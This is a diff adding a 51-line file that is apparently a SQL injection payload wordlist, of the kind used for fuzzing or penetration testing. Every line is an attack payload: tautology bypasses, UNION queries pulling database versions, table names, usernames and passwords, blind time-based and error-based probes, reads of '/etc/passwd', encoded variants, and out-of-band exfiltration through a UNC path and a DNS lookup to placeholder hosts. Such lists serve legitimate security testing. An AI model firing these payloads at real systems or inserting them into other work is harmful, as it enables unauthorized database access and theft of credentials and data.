@@ -1,0 +1,51 @@
+1' OR '1' = '1
+' OR 1=1 --
+' --
+' AND 1=0 --
+' UNION SELECT @@version, NULL --
+' UNION SELECT database(), NULL --
+' UNION SELECT user(), NULL --
+' UNION SELECT @@version, NULL --
+' UNION SELECT db_name(), NULL --
+' UNION SELECT @@hostname, NULL --
+' UNION SELECT banner FROM v$version WHERE rownum = 1 --
+' UNION SELECT username FROM all_users WHERE rownum = 1 --
+' UNION SELECT NULL --
+' UNION SELECT NULL, NULL --
+' UNION SELECT column1, column2 FROM table_name --
+' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables)) --
+' OR IF(1=1, SLEEP(5), 0) --
+' OR 1=CAST((SELECT COUNT(*) FROM information_schema.tables) AS int) --
+' UNION SELECT version(), NULL --
+' UNION SELECT current_database(), NULL --
+' UNION SELECT current_user, NULL --
+' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1)) > 64, SLEEP(5), 0) --
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() --
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
+%27%20OR%201%3D1%20--
+%u0027%u0020%u004F%u0052%u00201%u003D1%u0020%u002D%u002D
+' UNION SELECT table_name, column_name FROM information_schema.columns --
+' UNION SELECT LOAD_FILE('/etc/passwd'), NULL --
+' AND 1=CONVERT(int, (SELECT @@version)) --
+' AND 1=CONVERT(int, (SELECT table_name FROM information_schema.tables WHERE rownum = 1)) --
+' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1)) > 64, SLEEP(5), 0) --
+' UNION SELECT table_name FROM information_schema.tables LIMIT 0,1 --
+' UNION SELECT table_name, column_name FROM other_database.information_schema.columns --
+' AND 1=CASE WHEN (username='SYS') THEN dbms_pipe.receive_message('a',5) ELSE 1 END --
+' IF (1=1) WAITFOR DELAY '0:0:5' --
+' UNION SELECT 1, (SELECT load_file('\\\\yourserver\\share\\file')) --
+' UNION SELECT 1, (SELECT data FROM dns_lookup('yourdomain.com')) --
+' AND 1=CONVERT(int, (SELECT user())) --
+' UNION SELECT schema_name FROM information_schema.schemata --
+' UNION SELECT user FROM mysql.user --
+' UNION SELECT username, password FROM users --
+' UNION SELECT 1, IF(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)='u', SLEEP(5), 0) --
+' UNION SELECT (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1), NULL --
+%2527%2520OR%25201%253D1%2520--
+' UNION SELECT table_name, column_name FROM other_database.information_schema.columns --
+' UNION SELECT CHAR(45, 45, 32, 45, 45) --
+<user><name>' OR '1'='1</name></user>
+{"user": "' OR '1'='1"}
+' UNION SELECT email FROM users --
+' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1), 0x3a, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
+' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1), 1, 1)) > 64, SLEEP(5), 0) --
